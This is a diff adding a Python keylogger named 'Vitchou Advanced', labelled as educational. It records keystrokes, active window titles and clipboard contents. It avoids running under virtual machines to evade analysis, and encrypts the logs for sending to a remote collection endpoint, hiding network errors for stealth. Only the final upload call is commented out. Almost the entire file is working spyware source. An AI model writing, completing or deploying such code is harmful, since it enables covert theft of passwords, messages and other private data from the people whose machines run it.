@@ -1,0 +1,140 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+ ____   ____.__  __         .__                   
+ \   \ /   /|__|/  |_  ____ |  |__   ____  __ __  
+  \   Y   / |  \   __\/ ___\|  |  \ /  _ \|  |  \ 
+   \     /  |  ||  | \  \___|   Y  \(  <_> )  |  /
+    \___/   |__||__|  \___  >___|  / \____/|____/ 
+                          \/     \/               
+      VITCHOU ADVANCED KEYLOGGER - 2026 EDITION
+      FOR EDUCATIONAL PURPOSES ONLY.
+"""
+
+import asyncio
+import os
+import sys
+import subprocess
+import pyperclip
+import httpx
+from datetime import datetime
+from cryptography.fernet import Fernet
+from pynput import keyboard
+import pygetwindow as gw
+
+# --- SETTINGS ---
+CONFIG = {
+    # Symmetric encryption key (Generate with Fernet.generate_key())
+    "MASTER_KEY": os.getenv("VITCHOU_KEY", Fernet.generate_key().decode()),
+    # Endpoint for data exfiltration (API or Webhook)
+    "REPORT_URL": "https://api.vitchou-project.io/v1/collect",
+    # Number of characters before triggering a report
+    "BUFFER_THRESHOLD": 150,
+    # Enable/Disable Virtual Machine detection
+    "ANTI_VM": True 
+}
+
+class SecurityManager:
+    """Handles stealth and analysis environment detection."""
+    @staticmethod
+    def is_safe_environment() -> bool:
+        if not CONFIG["ANTI_VM"]: return True
+        try:
+            indicators = ["virtualbox", "vmware", "hyper-v", "qemu"]
+            # Fetch system info to detect hypervisors
+            output = subprocess.check_output("systeminfo", shell=True).decode().lower()
+            return not any(vm in output for vm in indicators)
+        except Exception:
+            # If check fails, assume safe to avoid crashing
+            return True
+
+class VitchouAdvanced:
+    def __init__(self):
+        self.fernet = Fernet(CONFIG["MASTER_KEY"].encode())
+        self.log_buffer = []
+        self.active_window = ""
+        self.queue = asyncio.Queue()
+
+    def _get_context(self) -> str:
+        """Identify the application currently focused by the user."""
+        try:
+            win = gw.getActiveWindow()
+            return win.title if win else "Desktop"
+        except Exception:
+            return "System"
+
+    async def clipboard_monitor(self):
+        """Asynchronously monitor clipboard for text changes."""
+        last_clip = ""
+        while True:
+            current_clip = pyperclip.paste()
+            if current_clip != last_clip:
+                last_clip = current_clip
+                await self.queue.put(f"\n[CLIPBOARD] {current_clip}\n")
+            await asyncio.sleep(5)
+
+    def on_press(self, key):
+        """Capture keystrokes and handle window context switching."""
+        ctx = self._get_context()
+        if ctx != self.active_window:
+            self.active_window = ctx
+            timestamp = datetime.now().strftime('%H:%M')
+            self.log_buffer.append(f"\n[{timestamp}] Focus: {ctx}\n")
+
+        try:
+            val = key.char
+        except AttributeError:
+            val = f"<{key}>"
+        
+        self.log_buffer.append(val)
+
+        # If buffer threshold is met, move data to the async queue
+        if len(self.log_buffer) >= CONFIG["BUFFER_THRESHOLD"]:
+            full_log = "".join(self.log_buffer)
+            asyncio.run_coroutine_threadsafe(self.queue.put(full_log), asyncio.get_event_loop())
+            self.log_buffer = []
+
+    async def data_dispatcher(self):
+        """Encrypt logs and dispatch them to the remote endpoint."""
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            while True:
+                raw_data = await self.queue.get()
+                # AES Encryption before network transport
+                encrypted_payload = self.fernet.encrypt(raw_data.encode())
+                
+                try:
+                    # Simulation of a secure POST request
+                    print(f"[Vitchou-System] Dispatching encrypted payload...")
+                    # await client.post(CONFIG["REPORT_URL"], content=encrypted_payload)
+                except Exception as e:
+                    # Silently fail on network errors to maintain stealth
+                    pass 
+                
+                self.queue.task_done()
+
+    def start(self):
+        """Initialize all services and listeners."""
+        if not SecurityManager.is_safe_environment():
+            print("Environment analysis detected. Exiting.")
+            sys.exit(0)
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
+        # Start the non-blocking keyboard listener
+        listener = keyboard.Listener(on_press=self.on_press)
+        listener.start()
+
+        # Launch asynchronous tasks
+        loop.create_task(self.clipboard_monitor())
+        loop.create_task(self.data_dispatcher())
+        
+        try:
+            loop.run_forever()
+        except KeyboardInterrupt:
+            print("\nVitchou Advanced stopped by user.")
+
+if __name__ == "__main__":
+    vitchou = VitchouAdvanced()
+    vitchou.start()
